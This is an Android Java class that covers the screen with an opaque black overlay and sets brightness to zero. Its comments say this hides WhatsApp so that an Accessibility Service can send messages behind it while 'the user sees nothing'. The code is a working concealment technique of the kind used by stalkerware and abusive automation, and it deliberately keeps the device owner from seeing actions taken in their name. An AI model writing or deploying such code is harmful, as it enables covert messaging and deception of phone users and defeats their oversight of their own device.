package com.freeisp.wa;

import android.content.Context;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.WindowManager;
import android.widget.FrameLayout;

/**
 * Creates a full-screen OPAQUE BLACK overlay that completely hides WhatsApp
 * while the Accessibility Service sends the message behind it.
 *
 * The user sees nothing — just a brief black screen that looks like the phone
 * screen turned off momentarily. Screen brightness is set to 0 during send.
 */
public class SendOverlayManager {
    private static final String TAG = "SendOverlay";

    private final Context context;
    private final WindowManager windowManager;
    private FrameLayout overlayView;
    private boolean isShowing = false;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private float originalBrightness = -1f;

    public SendOverlayManager(Context context) {
        this.context = context.getApplicationContext();
        this.windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
    }

    /**
     * Show a fully opaque black overlay that covers everything.
     * Also dims screen brightness to 0.
     */
    public void show(String phone) {
        if (isShowing) return;
        if (!Settings.canDrawOverlays(context)) {
            Log.w(TAG, "No overlay permission");
            return;
        }

        handler.post(() -> {
            try {
                // Simple fully opaque black view — no text, no spinner, nothing visible
                overlayView = new FrameLayout(context);
                overlayView.setBackgroundColor(Color.BLACK);

                int layoutType;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    layoutType = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
                } else {
                    layoutType = WindowManager.LayoutParams.TYPE_PHONE;
                }

                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        layoutType,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                                | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                                | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                                | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                                | WindowManager.LayoutParams.FLAG_FULLSCREEN,
                        PixelFormat.OPAQUE
                );
                params.gravity = Gravity.TOP | Gravity.START;

                // Set brightness to 0 so even AMOLED looks fully off
                originalBrightness = params.screenBrightness;
                params.screenBrightness = 0f;

                windowManager.addView(overlayView, params);
                isShowing = true;
                Log.i(TAG, "Overlay shown (opaque black, brightness 0)");

                // Safety timeout - remove after 20 seconds
                handler.postDelayed(this::dismiss, 20000);

            } catch (Exception e) {
                Log.e(TAG, "Failed to show overlay", e);
            }
        });
    }

    /**
     * Dismiss the overlay and restore brightness
     */
    public void dismiss() {
        handler.post(() -> {
            try {
                if (isShowing && overlayView != null) {
                    windowManager.removeView(overlayView);
                    overlayView = null;
                    isShowing = false;
                    Log.i(TAG, "Overlay dismissed");
                }
            } catch (Exception e) {
                Log.e(TAG, "Failed to dismiss overlay", e);
                isShowing = false;
                overlayView = null;
            }
        });
    }

    public boolean isShowing() {
        return isShowing;
    }
}
